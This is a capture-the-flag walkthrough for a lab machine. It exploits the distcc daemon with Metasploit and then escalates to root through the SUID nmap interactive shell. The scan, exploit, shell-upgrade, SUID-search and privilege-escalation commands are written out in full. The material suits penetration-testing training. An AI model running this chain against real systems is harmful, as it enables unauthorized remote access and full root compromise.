# A different Lame box walkthrough

In this walkthrough, I'll show you a **different way** of exploiting the Lame box than all the other walkthroughs (even the official one) show you. ;)

## nmap

As always, let's start with nmap. A standard nmap scan will show you four open ports:

	$ nmap -sV -sT -sC -Pn -oN nmapinitial.txt 10.10.10.3
	
	21/tcp  open  ftp  vsftpd 2.3.4
	22/tcp  open  ssh  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
	139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

But a more thorough scan reveals another port:

	$ nmap -oN scan3k-4k.txt -v -p 3000-4000 10.10.10.3

	3632/tcp open  distccd

Everyone starts with trying to exploit the ftp port (vsftpd 2.3.4), but it doesn't work (the vulnerability was patched).

So the next obvious attempt is the Samba exploit, which is what all the other Lame walkthroughs do - and it's a great exploit, but instead, let's use the port that everyone else ignores: `3632/tcp open  distccd`.

> If you'd like to learn what distccd is, check [this website](https://linux.die.net/man/1/distccd). It's basically a server for the distcc compiler.

## Metasploit

Let's run Metasploit:

	msfconsole

and then do the search to see if there's a `distccd` exploit present:

	search distccd

And sure enough, we find one (pretty old) exploit:

	msf5 > search distccd
	
	Matching Modules
	================
	
	   #  Name                           Disclosure Date  Rank       Check  Description
	   -  ----                           ---------------  ----       -----  -----------
	   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution

So let's run it:

	> use exploit/unix/misc/distcc_exec
	> set RHOST 10.10.10.3
	> run

Metasploit does it's magic... And we get shell access!

Type in `id` to see what user did we get:

	$ id
	uid=1(daemon) gid=1(daemon) groups=1(daemon)

Obviously, it's called `daemon` since we did exploit via `distccd` (which means "distcc daemon").

## Persistent shell

Let's make our shell a bit better looking:

	$ python -c "import pty;pty.spawn('/bin/bash')"

This will show us the name of the user, the host, and the current folder in our shell:

	daemon@lame:/tmp$

We're now in the `/tmp` folder.

## User flag

Let's see if we can get the user flag right away. First, navigate to the home folder and check what's there:

	cd /home
	ls -al

We can see four users having their own folders there:

	drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
	drwxr-xr-x  4 makis   makis   4096 Jan 20 06:25 makis
	drwxr-xr-x  2 service service 4096 Apr 16  2010 service
	drwxr-xr-x  3    1001    1001 4096 May  7  2010 user

`ftp`, `service`, and `user` look boring. Let's check `makis` first:

	daemon@lame:/home$ ls -al makis
	
	-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
	-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
	-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
	drwx------ 2 makis makis 4096 Jan 20 06:25 .gconf
	drwx------ 2 makis makis 4096 Jan 20 06:25 .gconfd
	-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
	-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
	-rw-r--r-- 1 makis makis   33 Mar 14  2017 user.txt

Our hunch was correct. There's the `user.txt` flag over there, and it looks like everyone has read permissions on it!

So open it with `cat` and get the user flag:

	cat user.txt

## Privilege escalation

Let's see if we can do the same with root.txt:

	cat /root/root.txt

We get `Permission denied`. We'll need to figure out how to escalate our privileges.

### SUID

Let's see which files have SUID permissions:

	daemon@lame:/home/makis$ find / -perm -u=s -type f 2>/dev/null
	
	/bin/umount
	/bin/fusermount
	/bin/su
	/bin/mount
	/bin/ping
	/bin/ping6
	/sbin/mount.nfs
	/lib/dhcp3-client/call-dhclient-script
	/usr/bin/sudoedit
	/usr/bin/X
	/usr/bin/netkit-rsh
	/usr/bin/gpasswd
	/usr/bin/traceroute6.iputils
	/usr/bin/sudo
	/usr/bin/netkit-rlogin
	/usr/bin/arping
	/usr/bin/at
	/usr/bin/newgrp
	/usr/bin/chfn
	/usr/bin/nmap
	/usr/bin/chsh
	/usr/bin/netkit-rcp
	/usr/bin/passwd
	/usr/bin/mtr
	/usr/sbin/uuidd
	/usr/sbin/pppd
	/usr/lib/telnetlogin
	/usr/lib/apache2/suexec
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/openssh/ssh-keysign
	/usr/lib/pt_chown

Quite a lot! Hopefully, we'll be able to exploit one of them to get the `root` shell.

### GTFObins

GTFObins is a nice collection of exploits on files with executable permissions. Let's go through the SUID list and try to find some exploit.

After a few misses, you'll find your homerun: `nmap`!

The Lame box uses nmap version 4.53 (you can check this with `nmap --version`) which allows the interactive mode:

	nmap --interactive

This opens an nmap shell inside which we can execute another shell:

	nmap> !sh

Since nmap executes with sudo privileges, this action gives us a root shell. You can confirm this by typing `whoami` in the new shell. It should return `root`.

## Root

Now that you finally have root access, you can try the cat command again:

	cat /root/root.txt

And there's your root flag!

---

This took a bit longer than just using the Samba exploit, but it was more fun and you can learn a lot more this way.
